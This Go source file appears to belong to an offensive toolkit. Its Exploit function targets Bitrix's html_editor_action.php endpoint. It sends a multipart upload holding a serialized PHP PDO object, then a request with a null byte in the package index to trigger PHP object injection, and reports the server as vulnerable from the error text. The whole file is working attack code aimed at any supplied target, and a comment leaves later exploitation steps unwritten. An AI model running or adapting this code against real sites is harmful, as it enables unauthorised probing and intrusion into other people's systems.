package he

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"github.com/indigo-sadland/quick-tricks/modules/tokens"
	"github.com/indigo-sadland/quick-tricks/utils/colors"
	"strings"
)

const endpoint = "/bitrix/tools/html_editor_action.php"

func Exploit(target string) error {
	compositeData, cookie, err := tokens.Get(target)
	if err != nil {
		return err
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		return err
	}
	var client http.Client
	var reqBody string
	var i int
	bitrixSessid := compositeData.BitrixSessid
	url := target + endpoint

	for i = 0; i <= 1; i++ {
		if i == 0 {
			reqBody = fmt.Sprintf(`
boundary=---------------------------0c803ee613db96bee7eb82d5275d9
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_files[file123][default]";
filename="test.txt"
Content-Type: text/plain
O:3:"PDO":0:{}
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_files[file123][files]"
1
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_info[packageIndex]"
pIndex1
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_info[CID]"
CID1652051936079
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_info[filesCount]"
1
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="bxu_info[mode]"
upload
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="sessid"
%s
-----------------------------0c803ee613db96bee7eb82d5275d9
Content-Disposition: form-data; name="action"
uploadfile
-----------------------------0c803ee613db96bee7eb82d5275d9--`, bitrixSessid)
		} else if i == 1 {
			reqBody = "bxu_info[packageIndex]=file123/default%00&bxu_info[CID]=1&action=uploadfile&bxu_info[mode]=upload&" +
				fmt.Sprintf("sessid=%s&", bitrixSessid)
		}

		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(reqBody)))
		req.Header.Set("Content-Type", "multipart/form-data;")
		req.AddCookie(cookie)
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		body, _ := io.ReadAll(resp.Body)
		if i == 0 {
			continue
		}
		if i == 1 {
			if strings.Contains(string(body), "You cannot serialize or unserialize PDO instances") {
				colors.OK.Println("Server is vulnerable!")
				//TODO: FIND VULNERABLE SERVER TO TEST NEXT STEPS

			} else {
				if len(string(body)) == 0 {
					colors.BAD.Println("Server is not vulnerable.")
				}
			}
		}
	}

	return nil
}
